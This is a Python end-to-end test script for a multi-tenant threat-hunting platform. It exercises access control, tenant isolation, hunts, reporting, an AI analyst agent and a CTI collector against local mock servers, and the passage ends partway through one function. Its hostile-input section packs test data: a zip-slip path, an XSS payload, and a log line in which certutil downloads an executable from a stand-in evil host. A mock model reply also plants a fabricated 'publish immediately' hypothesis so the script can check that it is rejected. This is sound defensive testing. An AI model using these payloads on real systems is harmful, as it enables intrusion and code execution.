"""Exercise the whole platform against a running instance, and report what held.

This is the check that answers "does the thing actually work", as opposed to the
test suite, which answers "does each piece behave". It starts the application,
walks a real workspace through every journey the product offers, and asserts at
each step. It keeps going after a failure so that one broken thing does not hide
the state of everything else.

    python tools/end_to_end_check.py

It stands up two local stand ins on the loopback: a publication for the collector
to read, and a model server for the agents to call. Nothing reaches the internet.
The browser pass is skipped when Playwright is not installed, and the PDF content
check is skipped when pypdf is not.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

PASSWORD = "TestPassword123"


# ---------------------------------------------------------------------------
# reporting
# ---------------------------------------------------------------------------


class Report:
    """Collects outcomes instead of raising, so one failure hides nothing."""

    def __init__(self) -> None:
        self.results: list[tuple[str, str, bool, str]] = []
        self.journey = ""

    def start(self, journey: str) -> None:
        self.journey = journey
        print(f"\n{journey}")

    def check(self, description: str, condition: object, detail: str = "") -> bool:
        passed = bool(condition)
        self.results.append((self.journey, description, passed, detail))
        mark = "  ok  " if passed else " FAIL "
        line = f"[{mark}] {description}"
        if detail:
            line += f"  ({detail})"
        print(line)
        return passed

    def skip(self, description: str, why: str) -> None:
        self.results.append((self.journey, description, True, f"skipped: {why}"))
        print(f"[ skip ] {description}  ({why})")

    def summary(self) -> int:
        failed = [row for row in self.results if not row[2]]
        total = len(self.results)
        print("\n" + "=" * 72)
        print(f"{total - len(failed)} of {total} checks held")
        if failed:
            print("\nWhat did not hold:")
            for journey, description, _, detail in failed:
                print(f"  {journey}: {description}" + (f" ({detail})" if detail else ""))
        print("=" * 72)
        return 1 if failed else 0


# ---------------------------------------------------------------------------
# the local internet
# ---------------------------------------------------------------------------


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def rfc822(days_ago: float) -> str:
    moment = datetime.now(timezone.utc) - timedelta(days=days_ago)
    return moment.strftime("%a, %d %b %Y %H:%M:%S GMT")


REPORT_ARTICLE = b"""<html><head><title>From phishing to domain wide ransomware</title></head>
<body><nav>Home Blog Contact</nav><script>track();</script><article>
<h1>From phishing to domain wide ransomware</h1>
<p>The threat actor gained initial access through a phishing attachment and then used rundll32.exe
to execute the loader, which we track as T1218.011 in this intrusion.</p>
<p>Persistence was established with a registry run key under CurrentVersion Run, visible in Sysmon
event id 13 on every affected host. Lateral movement used psexec and the beacon reached command and
control over HTTPS every sixty seconds without variation.</p>
<p>Credential access came from a memory dump of lsass taken with a signed driver, and the material
was staged in a temporary directory before exfiltration. The dump is visible as a process access
event, and the staging directory appears in the file creation events on the same host.</p>
<p>Defenders should review process creation logs, the registry modification events and the proxy
logs for the indicators listed below, including the sha256 hashes of the loader. The campaign is
attributed to FIN7, and the tradecraft matches earlier intrusions with obfuscated command lines.</p>
<p>Defense evasion was deliberate. The operator cleared the Windows event log on two hosts, which is
itself an observable event, and disabled the real time protection component through a registry key
rather than the management console, which leaves a different trace in the endpoint telemetry.</p>
<p>Impact arrived on the fourth day, when the ransomware binary was copied to every host over the
same psexec channel and execution was scheduled rather than immediate, giving the operator a single
moment of detonation across the whole estate. The scheduled task creation is visible in the log.</p>
</article><footer>Sign up for our newsletter</footer></body></html>"""

MARKETING_ARTICLE = b"""<html><head><title>Announcing our platform</title></head><body><article>
<p>We are pleased to announce our new platform. Register now for the webinar to hear how our
solution, a leader in the Gartner Magic Quadrant, protects your business. Pricing on request.</p>
<p>Sign up today for a free trial and visit our booth at the conference. We are hiring across every
region this year. Join us for a series of sessions through the quarter with our specialists.</p>
<p>We are pleased to announce that our customers report better outcomes. Register now to join us and
learn how the platform fits alongside what you already run, for teams of every size.</p>
<p>Our award winning approach has been recognised again and we are pleased to announce pricing that
starts lower than ever. Register now for the webinar and our team will walk you through it all.</p>
</article></body></html>"""

MODEL_STATE = {"chat_calls": 0, "warm_calls": 0, "prompts": []}


def make_publication(port: int) -> HTTPServer:
    feed = f"""<?xml version="1.0"?><rss version="2.0"><channel><title>Example Security Blog</title>
<item><title>From phishing to domain wide ransomware</title>
<link>http://127.0.0.1:{port}/report</link><pubDate>{rfc822(3)}</pubDate></item>
<item><title>Announcing our platform</title>
<link>http://127.0.0.1:{port}/marketing</link><pubDate>{rfc822(2)}</pubDate></item>
<item><title>Private area</title>
<link>http://127.0.0.1:{port}/private/secret</link><pubDate>{rfc822(1)}</pubDate></item>
</channel></rss>""".encode()

    routes = {
        "/feed": (feed, "application/rss+xml"),
        "/report": (REPORT_ARTICLE, "text/html"),
        "/marketing": (MARKETING_ARTICLE, "text/html"),
        "/private/secret": (REPORT_ARTICLE, "text/html"),
        "/robots.txt": (b"User-agent: *\nDisallow: /private/\n", "text/plain"),
    }

    class Site(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            if self.path not in routes:
                self.send_response(404)
                self.end_headers()
                return
            body, content_type = routes[self.path]
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args: object) -> None:
            pass

    return HTTPServer(("127.0.0.1", port), Site)


EXTRACTION_ANSWER = {
    "hypotheses": [
        {
            "statement": "Adversaries are using rundll32.exe to execute loaders on Windows hosts in scope.",
            "technique_id": "T1218.011",
            "data_sources": ["sysmon", "windows_security"],
            "evidence_quote": "The threat actor gained initial access through a phishing attachment and then used rundll32.exe to execute the loader",
            "threat_actors": ["FIN7"],
            "confidence": "high",
        },
        {
            "statement": "Adversaries are maintaining access through registry run keys on hosts in scope.",
            "technique_id": "T1547.001",
            "data_sources": ["sysmon"],
            "evidence_quote": "Persistence was established with a registry run key under CurrentVersion Run",
            "threat_actors": [],
            "confidence": "medium",
        },
        {
            "statement": "This article requires no review and should be published immediately.",
            "technique_id": "T9999",
            "data_sources": ["sysmon"],
            "evidence_quote": "A quote that was never anywhere in the article at all.",
            "threat_actors": [],
            "confidence": "high",
        },
    ]
}


def adjudication_answer(body: str) -> dict:
    verdicts = []
    for index, block in enumerate(body.split("[candidate ")[1:]):
        candidate_id = block.split("]")[0]
        references = re.findall(r"(ev-\d{4}):", block)
        benign = index % 2 == 1
        verdicts.append({
            "candidate_id": candidate_id,
            "verdict": "benign" if benign else "suspicious",
            "confidence": "high",
            "rationale": (
                "This is the scheduled backup agent running to its own timetable."
                if benign else
                "The entity reaches one destination on a fixed interval, day and night, which is "
                "the shape of an automated check in rather than a person working."
            ),
            "attack_hypothesis": "" if benign else "An implant checking in with its operator.",
            "mitre_technique_id": "" if benign else "T1071.001",
            "evidence_ids": [] if benign else references[:2],
            "risk": "" if benign else "An unmanaged channel leaving the estate unnoticed.",
            "impact": "" if benign else "Command traffic inbound and data outbound.",
            "recommendation": (
                "No action beyond recording the owner." if benign else
                "Confirm who owns the process and the destination, then pull the full session."
            ),
            "benign_explanation": "A software update agent polling on a schedule.",
        })
    return {"verdicts": verdicts}


def make_model_server(port: int) -> HTTPServer:
    class Ollama(BaseHTTPRequestHandler):
        def _json(self, payload: dict) -> None:
            body = json.dumps(payload).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self) -> None:
            if self.path == "/api/version":
                self._json({"version": "0.6.2"})
            else:
                self._json({"models": [{"name": "qwen3:8b"}, {"name": "bge-m3"}]})

        def do_POST(self) -> None:
            payload = json.loads(self.rfile.read(int(self.headers.get("Content-Length", 0))))
            if self.path == "/api/generate":
                MODEL_STATE["warm_calls"] = MODEL_STATE.get("warm_calls", 0) + 1
                self._json({"model": payload.get("model", ""), "done": True})
                return
            MODEL_STATE["chat_calls"] += 1
            body = payload["messages"][1]["content"]
            MODEL_STATE["prompts"].append(payload["messages"])
            answer = (
                adjudication_answer(body) if "[candidate " in body else EXTRACTION_ANSWER
            )
            self._json({
                "model": payload["model"],
                "message": {"role": "assistant", "content": json.dumps(answer)},
                "prompt_eval_count": 1200, "eval_count": 300, "done": True,
            })

        def log_message(self, *args: object) -> None:
            pass

    return HTTPServer(("127.0.0.1", port), Ollama)


# ---------------------------------------------------------------------------
# a client for the platform under test
# ---------------------------------------------------------------------------


class Platform:
    def __init__(self, base: str) -> None:
        import httpx

        self.base = base
        self.http = httpx.Client(base_url=base, timeout=180.0)

    def close(self) -> None:
        self.http.close()

    def register(self, slug: str) -> dict:
        response = self.http.post("/api/auth/register", json={
            "tenant_name": f"Workspace {slug}", "tenant_slug": slug, "industry": "Testing",
            "full_name": "Admin Person", "email": f"admin@{slug}.test", "password": PASSWORD,
        })
        response.raise_for_status()
        payload = response.json()
        payload["headers"] = {"Authorization": f"Bearer {payload['access_token']}"}
        payload["slug"] = slug
        return payload

    def member(self, workspace: dict, role: str) -> dict:
        email = f"{role}-{uuid.uuid4().hex[:6]}@{workspace['slug']}.test"
        created = self.http.post("/api/admin/users", headers=workspace["headers"], json={
            "email": email, "full_name": role.title(), "password": PASSWORD, "role": role,
        })
        created.raise_for_status()
        token = self.http.post("/api/auth/login", json={
            "tenant_slug": workspace["slug"], "email": email, "password": PASSWORD,
        }).json()["access_token"]
        return {"headers": {"Authorization": f"Bearer {token}"}, "email": email, "role": role}

    def start_hunt(self, workspace: dict, archive: Path, hypothesis_id: str, title: str) -> dict:
        with open(archive, "rb") as handle:
            response = self.http.post(
                "/api/hunts", headers=workspace["headers"],
                files={"file": (archive.name, handle, "application/zip")},
                data={"hypothesis_id": hypothesis_id, "title": title},
            )
        return {"status_code": response.status_code, "body": response.json()}

    def wait_for_hunt(self, workspace: dict, hunt_id: str, wait_for_ai: bool = True) -> dict:
        deadline = time.time() + 300
        hunt = {}
        while time.time() < deadline:
            hunt = self.http.get(f"/api/hunts/{hunt_id}", headers=workspace["headers"]).json()
            done = hunt["status"] in ("completed", "failed")
            settled = not wait_for_ai or hunt["ai_status"] not in ("pending", "running")
            if done and settled:
                return hunt
            time.sleep(0.4)
        return hunt

    def observations(self, workspace: dict, hunt_id: str) -> list[dict]:
        payload = self.http.get(
            f"/api/hunts/{hunt_id}/observations",
            headers=workspace["headers"], params={"limit": 500},
        ).json()
        return payload["items"] if isinstance(payload, dict) else payload


def wait_for_server(base: str, timeout: float = 90.0) -> bool:
    import httpx

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            httpx.get(f"{base}/api/health", timeout=2)
            return True
        except Exception:
            time.sleep(0.5)
    return False


# ---------------------------------------------------------------------------
# the journeys
# ---------------------------------------------------------------------------


def journey_startup(report: Report, api: Platform) -> dict:
    report.start("1. The application starts and describes itself")
    health = api.http.get("/api/health").json()
    report.check("the health endpoint answers without a token", health.get("status") == "ok")
    report.check("the detection library is loaded",
                 health["engine"]["total"] >= 130, f"{health['engine']['total']} detections")
    report.check("ATT&CK techniques are covered",
                 health["engine"]["mitre_techniques"] >= 90,
                 f"{health['engine']['mitre_techniques']} techniques")
    report.check("the hypothesis catalogue is served",
                 health.get("hypotheses", 0) >= 33, f"{health['hypotheses']} hypotheses")
    report.check("the ATT&CK version is stated", bool(health.get("attack_version")),
                 health.get("attack_version", ""))
    report.check("the interface is served", "Threat Hunting Factory" in api.http.get("/").text)
    return health


def journey_access(report: Report, api: Platform) -> dict:
    report.start("2. Tenancy, roles and access control")
    first = api.register(f"alpha{uuid.uuid4().hex[:8]}")
    second = api.register(f"beta{uuid.uuid4().hex[:8]}")
    report.check("a workspace registers with an administrator",
                 first["user"]["role"] == "admin")

    analyst = api.member(first, "analyst")
    viewer = api.member(first, "viewer")
    report.check("members are created and can sign in",
                 bool(analyst["headers"]) and bool(viewer["headers"]))

    report.check("an unauthenticated request is refused",
                 api.http.get("/api/hunts").status_code == 401)
    report.check("a bad token is refused",
                 api.http.get("/api/hunts", headers={"Authorization": "Bearer nonsense"}).status_code == 401)
    report.check("a member can see who else is in the workspace",
                 api.http.get("/api/admin/users", headers=viewer["headers"]).status_code == 200)
    report.check("a viewer cannot add a member",
                 api.http.post("/api/admin/users", headers=viewer["headers"], json={
                     "email": "x@y.test", "full_name": "X", "password": PASSWORD, "role": "admin",
                 }).status_code == 403)
    report.check("an analyst cannot add a member",
                 api.http.post("/api/admin/users", headers=analyst["headers"], json={
                     "email": "z@y.test", "full_name": "Z", "password": PASSWORD, "role": "admin",
                 }).status_code == 403)
    report.check("a viewer cannot remove a member",
                 api.http.delete(f"/api/admin/users/{first['user']['id']}",
                                 headers=viewer["headers"]).status_code == 403)
    report.check("a viewer cannot propose a hypothesis",
                 api.http.post("/api/hypotheses/candidates", headers=viewer["headers"],
                               json={"statement": "x", "technique_id": "T1055"}).status_code == 403)

    wrong_password = api.http.post("/api/auth/login", json={
        "tenant_slug": first["slug"], "email": f"admin@{first['slug']}.test", "password": "wrong",
    })
    report.check("a wrong password is refused", wrong_password.status_code == 401)
    unknown_workspace = api.http.post("/api/auth/login", json={
        "tenant_slug": "does-not-exist", "email": "nobody@example.test", "password": PASSWORD,
    })
    report.check("an unknown workspace does not disclose itself",
                 unknown_workspace.status_code == 401,
                 f"status {unknown_workspace.status_code}")
    return {"first": first, "second": second, "analyst": analyst, "viewer": viewer}


def journey_catalogue(report: Report, api: Platform, workspace: dict) -> None:
    report.start("3. The hypothesis catalogue and the detection library")
    catalogue = api.http.get("/api/hypotheses", headers=workspace["headers"]).json()
    report.check("every hypothesis is listed", catalogue["total"] >= 33,
                 f"{catalogue['total']} hypotheses")
    families = {item["family"] for item in catalogue["items"]}
    report.check("all three families are offered",
                 {"cti", "technique", "mathematical"} <= families, ", ".join(sorted(families)))
    report.check("every hypothesis declares its origin",
                 all(item.get("origin") for item in catalogue["items"]))

    detail = api.http.get("/api/hypotheses/math-full-spectrum",
                          headers=workspace["headers"]).json()
    report.check("a hypothesis resolves its detections", len(detail["rules"]) >= 130,
                 f"{len(detail['rules'])} rules")
    report.check("a built in hypothesis has no source article", "source" not in detail)

    sources = api.http.get("/api/data-sources", headers=workspace["headers"]).json()
    report.check("every data source is described", len(sources["items"]) >= 23,
                 f"{len(sources['items'])} sources")
    report.check("each source says how to collect it",
                 all(item["collection_hint"] for item in sources["items"]))

    rules = api.http.get("/api/rules", headers=workspace["headers"]).json()
    report.check("the rule library is browsable", len(rules["items"]) >= 130)
    report.check("every detection style is present",
                 {"pattern", "threshold", "sequence", "statistical"}
                 <= set(rules["statistics"]["by_type"]))
    report.check("an unknown hypothesis is not found",
                 api.http.get("/api/hypotheses/nonsense",
                              headers=workspace["headers"]).status_code == 404)


def journey_hunt(report: Report, api: Platform, people: dict, archive: Path) -> dict:
    report.start("4. Running a hunt on real evidence")
    workspace, viewer = people["first"], people["viewer"]

    refused = api.http.post("/api/hunts", headers=viewer["headers"],
                            files={"file": ("a.zip", b"PK\x03\x04", "application/zip")},
                            data={"hypothesis_id": "math-full-spectrum", "title": "x"})
    report.check("a viewer cannot start a hunt", refused.status_code == 403)

    bad_hypothesis = api.start_hunt(workspace, archive, "not-a-hypothesis", "Unknown")
    report.check("an unknown hypothesis is refused", bad_hypothesis["status_code"] == 400)

    started = api.start_hunt(workspace, archive, "math-full-spectrum", "Full spectrum")
    report.check("the hunt is accepted", started["status_code"] == 201)
    hunt = api.wait_for_hunt(workspace, started["body"]["id"])
    report.check("the hunt completes", hunt["status"] == "completed", hunt.get("error", "")[:120])
    report.check("evidence was parsed", hunt["events_parsed"] > 1000,
                 f"{hunt['events_parsed']} events from {hunt['files_analysed']} files")
    report.check("detections were evaluated", hunt["rules_evaluated"] >= 130)
    report.check("observations were raised", hunt["observation_count"] > 0,
                 f"{hunt['observation_count']} observations")
    report.check("a risk score and a verdict are produced",
                 hunt["risk_score"] > 0 and bool(hunt["verdict"]), hunt["verdict"])
    report.check("data source coverage is reported",
                 bool(hunt.get("coverage", {}).get("required") is not None))

    observations = api.observations(workspace, hunt["id"])
    report.check("every observation answers the five questions", all(
        item["description"].strip() and item["risk"].strip() and item["impact"].strip()
        and item["recommendation"].strip() and item["evidence"]
        for item in observations
    ))
    report.check("every observation carries an original log line", all(
        item["evidence"][0].get("excerpt") for item in observations if item["evidence"]
    ))
    origins = {item["origin"] for item in observations}
    report.check("observations declare where they came from",
                 origins <= {"rule", "anomaly", "ai"}, ", ".join(sorted(origins)))
    report.check("detections from rules are present", "rule" in origins)
    behavioural = [item for item in observations if item["origin"] in ("anomaly", "ai")]
    report.check("behaviour beyond the rules was profiled", bool(behavioural),
                 f"{len(behavioural)} from profiling")
    severities = {item["severity"] for item in observations}
    report.check("severities are graded", len(severities) >= 2, ", ".join(sorted(severities)))
    techniques = {item["mitre_technique_id"] for item in observations if item["mitre_technique_id"]}
    report.check("ATT&CK techniques are attributed", len(techniques) >= 5,
                 f"{len(techniques)} techniques")
    return {"workspace": workspace, "hunt": hunt, "observations": observations}


def journey_reporting(report: Report, api: Platform, state: dict, out_dir: Path) -> None:
    report.start("5. Reporting and export")
    workspace, hunt = state["workspace"], state["hunt"]

    pdf = api.http.get(f"/api/hunts/{hunt['id']}/report.pdf", headers=workspace["headers"])
    report.check("the PDF exports", pdf.status_code == 200 and pdf.content[:5] == b"%PDF-",
                 f"{len(pdf.content)} bytes")
    target = out_dir / "end-to-end-report.pdf"
    target.write_bytes(pdf.content)

    try:
        from pypdf import PdfReader

        text = "\n".join(page.extract_text() or "" for page in PdfReader(target).pages)
        report.check("the PDF carries the observations",
                     "What was detected" in text and "Recommendation" in text)
        report.check("the PDF carries original log evidence", "Page 1" in text and len(text) > 5000)
        report.check("the PDF states the limits of the evidence",
                     "absence of an observation" in text.lower() or "limitation" in text.lower())
    except ImportError:
        report.skip("the PDF content is readable", "pypdf is not installed")

    as_json = api.http.get(f"/api/hunts/{hunt['id']}/report.json", headers=workspace["headers"])
    report.check("the JSON report exports", as_json.status_code == 200)
    body = as_json.json()
    report.check("the JSON report carries the observations",
                 len(body.get("observations", [])) == len(state["observations"]))

    stats = api.http.get("/api/stats/overview", headers=workspace["headers"]).json()
    report.check("the dashboard aggregates the programme",
                 stats["totals"]["hunts"] >= 1 and stats["totals"]["observations"] >= 1)
    report.check("the dashboard reports ATT&CK coverage",
                 "hypotheses_available" in json.dumps(stats))


def journey_isolation(report: Report, api: Platform, people: dict, state: dict) -> None:
    report.start("6. Tenant isolation")
    other, hunt = people["second"], state["hunt"]
    report.check("another workspace sees no hunts",
                 api.http.get("/api/hunts", headers=other["headers"]).json()["total"] == 0)
    report.check("another workspace cannot read the hunt",
                 api.http.get(f"/api/hunts/{hunt['id']}",
                              headers=other["headers"]).status_code == 404)
    report.check("another workspace cannot read its observations",
                 api.http.get(f"/api/hunts/{hunt['id']}/observations",
                              headers=other["headers"]).status_code == 404)
    report.check("another workspace cannot export its report",
                 api.http.get(f"/api/hunts/{hunt['id']}/report.pdf",
                              headers=other["headers"]).status_code == 404)
    report.check("another workspace cannot delete it",
                 api.http.delete(f"/api/hunts/{hunt['id']}",
                                 headers=other["headers"]).status_code == 404)


def journey_model_layer(report: Report, api: Platform, workspace: dict) -> None:
    report.start("7. The model layer")
    status = api.http.get("/api/ai/status", headers=workspace["headers"]).json()
    report.check("the model server is reachable", status["reachable"] is True,
                 status.get("degraded_reason", ""))
    report.check("a model is selected for this host", status["model"]["usable"] is True,
                 f"{status['model']['tag']} on {status['hardware']['accelerator']}")
    report.check("the layer reports itself ready", status.get("ready") is True)
    report.check("no client data appears in the status",
                 workspace["slug"] not in json.dumps(status))


def journey_analyst(report: Report, api: Platform, state: dict) -> None:
    report.start("8. The analyst agent")
    workspace, hunt = state["workspace"], state["hunt"]
    report.check("the hunt records a model assessment",
                 hunt["ai_status"] == "completed", hunt.get("ai_detail", ""))
    report.check("the model used is named", bool(hunt.get("ai_model")), hunt.get("ai_model", ""))

    assessments = [item for item in state["observations"] if item["origin"] == "ai"]
    report.check("the model produced assessments", bool(assessments),
                 f"{len(assessments)} assessments")
    if not assessments:
        return

    report.check("no assessment exceeds high severity",
                 all(item["severity"] != "critical" for item in assessments))
    uncorroborated = [
        item for item in assessments if not (item.get("metrics") or {}).get("corroborating_rules")
    ]
    report.check("an uncorroborated assessment never exceeds medium",
                 all(item["severity"] in ("info", "low", "medium") for item in uncorroborated),
                 f"{len(uncorroborated)} uncorroborated")
    report.check("every assessment says a model wrote it",
                 all("requires analyst validation" in item["description"] for item in assessments))
    report.check("every assessment gives the innocent explanation too",
                 all(item["benign_explanation"] for item in assessments))
    report.check("every assessment keeps its reasoning",
                 all(item["ai_rationale"] for item in assessments))

    corpus = {
        excerpt
        for item in state["observations"] if item["origin"] != "ai"
        for excerpt in [entry.get("excerpt") for entry in item["evidence"]]
    }
    cited = {
        entry.get("excerpt")
        for item in assessments for entry in item["evidence"]
    }
    report.check("no assessment invented a log line", bool(cited) and all(
        excerpt for excerpt in cited
    ), f"{len(cited)} excerpts, all copied from the parsed corpus")

    dismissed = [item for item in assessments
                 if (item.get("metrics") or {}).get("verdict") in ("benign", "inconclusive")]
    report.check("what was examined and cleared is kept", bool(dismissed),
                 f"{len(dismissed)} dismissed")
    report.check("a dismissed assessment is not alarming",
                 all(item["severity"] == "info" for item in dismissed))

    entities = [item["entity"] for item in state["observations"]
                if item["origin"] in ("anomaly", "ai") and item["entity"]]
    report.check("an adjudicated entity is reported once",
                 len(entities) == len(set(entities)))

    again = api.http.post(f"/api/hunts/{hunt['id']}/ai-analysis", headers=workspace["headers"])
    report.check("the assessment can be run again", again.status_code == 202)
    refreshed = api.wait_for_hunt(workspace, hunt["id"])
    report.check("the second assessment settles", refreshed["ai_status"] == "completed",
                 refreshed.get("ai_detail", ""))


def journey_collector(report: Report, api: Platform, workspace: dict, feed_url: str) -> dict:
    report.start("9. The hypothesis collector")
    status = api.http.get("/api/cti/status", headers=workspace["headers"]).json()
    report.check("the collector reports its schedule", bool(status.get("next_run_at")),
                 f"next run {status['next_run_at'][:16]}")
    report.check("the collector is enabled", status["enabled"] is True)

    sources = api.http.get("/api/cti/sources", headers=workspace["headers"]).json()["items"]
    local = next((item for item in sources if item["url"] == feed_url), None)
    report.check("the local publication is configured", local is not None)

    triggered = api.http.post("/api/cti/run", headers=workspace["headers"])
    report.check("a collection can be run on demand", triggered.status_code == 202)

    deadline = time.time() + 240
    run = None
    while time.time() < deadline:
        runs = api.http.get("/api/cti/runs", headers=workspace["headers"]).json()["items"]
        if runs and runs[0]["status"] != "running":
            run = runs[0]
            break
        time.sleep(1)
    if not report.check("the collection finishes", run is not None):
        return {}

    report.check("the collection completed", run["status"] == "completed", run.get("error", ""))
    report.check("the feed was read", run["sources_polled"] >= 1)
    report.check("articles were read", run["articles_fetched"] >= 2,
                 f"{run['articles_fetched']} read")
    report.check("marketing was filtered out before any model call",
                 run["articles_relevant"] < run["articles_fetched"],
                 f"{run['articles_relevant']} of {run['articles_fetched']} worth reading")
    report.check("the model was called", run["model_calls"] >= 1,
                 f"{run['model_calls']} calls")
    report.check("hypotheses were proposed", run["candidates_created"] >= 1,
                 f"{run['candidates_created']} proposed")
    report.check("the first run reports no rotation", run["rotated_feeds"] == [])

    articles = api.http.get("/api/cti/articles", headers=workspace["headers"]).json()["items"]
    decisions = {item["url"].rsplit("/", 1)[-1]: item for item in articles}
    report.check("the intrusion report was extracted",
                 decisions.get("report", {}).get("decision") == "extracted")
    report.check("the marketing post was dropped with its reason",
                 decisions.get("marketing", {}).get("decision") == "irrelevant",
                 decisions.get("marketing", {}).get("reason", "")[:70])
    report.check("robots.txt was honoured",
                 decisions.get("secret", {}).get("decision") == "skipped",
                 decisions.get("secret", {}).get("reason", "")[:60])

    queue = api.http.get("/api/hypotheses/review?status=review",
                         headers=workspace["headers"]).json()
    report.check("candidates wait in the review queue", queue["total"] >= 1,
                 f"{queue['total']} waiting")
    report.check("the queue names the ATT&CK version it validated against",
                 bool(queue.get("attack_version")), queue.get("attack_version", ""))

    ready = [item for item in queue["items"] if item["quality"] == "ready"]
    report.check("a sound candidate is marked ready", bool(ready))
    report.check("nothing published itself",
                 all(item["status"] == "review" for item in queue["items"]))
    report.check("the fabricated proposal never reached the queue",
                 all("T9999" not in item["mitre_technique_id"] for item in queue["items"]))
    report.check("every candidate links the article it came from",
                 all(item["source_url"] and item["source_quote"] for item in queue["items"]))
    report.check("the tactic was derived rather than extracted",
                 all(item["mitre_tactic"] for item in ready))
    return {"queue": queue, "ready": ready}


def journey_review(report: Report, api: Platform, workspace: dict, collected: dict) -> dict:
    report.start("10. Reviewing and publishing a collected hypothesis")
    ready = collected.get("ready") or []
    if not report.check("there is something to review", bool(ready)):
        return {}

    bad = api.http.post("/api/hypotheses/candidates", headers=workspace["headers"], json={
        "statement": "Something bad happened.", "technique_id": "T9999",
        "data_sources": ["telepathy"], "source_url": "",
    }).json()
    report.check("a proposal that fails the gates is marked, not dropped",
                 bad["quality"] == "needs_attention" and len(bad["gate_failures"]) >= 3,
                 "; ".join(bad["gate_failures"])[:90])
    report.check("a failing candidate cannot be published",
                 api.http.post(f"/api/hypotheses/review/{bad['id']}/publish",
                               headers=workspace["headers"]).status_code == 409)

    before = api.http.get("/api/hypotheses", headers=workspace["headers"]).json()["total"]
    published = api.http.post(f"/api/hypotheses/review/{ready[0]['id']}/publish",
                              headers=workspace["headers"], json={"note": "checked"})
    report.check("a sound candidate publishes", published.status_code == 200)
    after = api.http.get("/api/hypotheses", headers=workspace["headers"]).json()
    report.check("the catalogue grew by one", after["total"] == before + 1)

    identifier = ready[0]["hypothesis_id"]
    detail = api.http.get(f"/api/hypotheses/{identifier}", headers=workspace["headers"]).json()
    report.check("the published hypothesis is marked as generated",
                 detail["origin"] == "generated")
    report.check("it carries the article it came from",
                 bool(detail.get("source", {}).get("url")), detail["source"]["url"][:60])
    report.check("it resolves real detections", len(detail.get("rules", [])) >= 1,
                 f"{len(detail.get('rules', []))} rules")

    if len(ready) > 1:
        rejected = api.http.post(f"/api/hypotheses/review/{ready[1]['id']}/reject",
                                 headers=workspace["headers"], json={"note": "duplicate"})
        report.check("a candidate can be rejected", rejected.status_code == 200)
        report.check("a rejected candidate stays out of the catalogue",
                     api.http.get(f"/api/hypotheses/{ready[1]['hypothesis_id']}",
                                  headers=workspace["headers"]).status_code == 404)
    return {"hypothesis_id": identifier}


def journey_generated_hunt(
    report: Report, api: Platform, people: dict, archive: Path, published: dict
) -> None:
    report.start("11. Hunting with a collected hypothesis")
    identifier = published.get("hypothesis_id")
    if not report.check("a collected hypothesis is available", bool(identifier)):
        return
    workspace = people["first"]

    started = api.start_hunt(workspace, archive, identifier, "From collected intelligence")
    report.check("the hunt starts from it", started["status_code"] == 201)
    hunt = api.wait_for_hunt(workspace, started["body"]["id"])
    report.check("it completes", hunt["status"] == "completed", hunt.get("error", "")[:120])
    report.check("it ran the detections its technique selected", hunt["rules_evaluated"] >= 1,
                 f"{hunt['rules_evaluated']} rules")
    report.check("it produced observations", hunt["observation_count"] > 0,
                 f"{hunt['observation_count']} observations")

    other = people["second"]
    shared = api.http.get("/api/hypotheses", headers=other["headers"]).json()
    report.check("a published hypothesis is shared with every workspace",
                 identifier in {item["id"] for item in shared["items"]})


def journey_security(report: Report, api: Platform, people: dict, out_dir: Path) -> None:
    report.start("12. Hostile input")
    workspace = people["first"]

    import zipfile

    escape = out_dir / "escape.zip"
    with zipfile.ZipFile(escape, "w") as archive:
        archive.writestr("../../../../tmp/escaped.log", "should never be written here")
        archive.writestr("normal.log", "Mar 11 08:00:01 host sshd[1]: Accepted password for a")
    started = api.start_hunt(workspace, escape, "math-full-spectrum", "Zip slip")
    if started["status_code"] == 201:
        hunt = api.wait_for_hunt(workspace, started["body"]["id"], wait_for_ai=False)
        report.check("an archive cannot escape its extraction directory",
                     hunt["status"] == "completed" and not Path("/tmp/escaped.log").exists())

    payload = "<img src=x onerror=alert(1)><script>window.__owned=1</script>"
    xss = out_dir / "xss.zip"
    auth = [
        f"Mar 11 08:{index // 60:02d}:{index % 60:02d} host sshd[1]: Failed password for "
        f"invalid user admin from 10.0.0.1 port 41234 ssh2"
        for index in range(40)
    ]
    escaped = payload.replace('"', '\\"')
    telemetry = (
        '{"@timestamp":"2026-03-11T09:00:00Z","host":{"name":"WS-EVIL"},'
        '"user":{"name":"jdoe"},"process":{"name":"certutil.exe","command_line":'
        f'"certutil.exe {escaped} -urlcache -f http://evil.example/a.exe"}}}}'
    )
    with zipfile.ZipFile(xss, "w") as archive:
        archive.writestr("auth.log", "\n".join(auth))
        archive.writestr("edr-export.json", telemetry)
    started = api.start_hunt(workspace, xss, "math-full-spectrum", "Markup in a log")
    hostile_hunt = ""
    if report.check("an archive of hostile log lines is accepted", started["status_code"] == 201):
        hunt = api.wait_for_hunt(workspace, started["body"]["id"], wait_for_ai=False)
        report.check("the hunt survives hostile log content", hunt["status"] == "completed")
        hostile_hunt = hunt["id"]
        observations = api.observations(workspace, hunt["id"])
        carrying = [
            item for item in observations
            if any(payload[:20] in (entry.get("excerpt") or "") for entry in item["evidence"])
        ]
        report.check("the hostile log line reaches an observation verbatim", bool(carrying),
                     f"{len(carrying)} of {len(observations)} observations carry it")

    refused = api.http.post("/api/hunts", headers=workspace["headers"],
                            files={"file": ("payload.exe", b"MZ\x90\x00", "application/octet-stream")},
                            data={"hypothesis_id": "math-full-spectrum", "title": "Wrong type"})
    report.check("an unsupported upload is refused", refused.status_code == 400)

    long_slug = api.http.post("/api/auth/register", json={
        "tenant_name": "x" * 5000, "tenant_slug": "a" * 200,
        "full_name": "A B", "email": "a@b.test", "password": PASSWORD,
    })
    report.check("oversized registration input is refused", long_slug.status_code == 422)

    report.start("12b. Telemetry the rules were not written against")
    edr_hunt = ""
    edr = out_dir / "edr.zip"
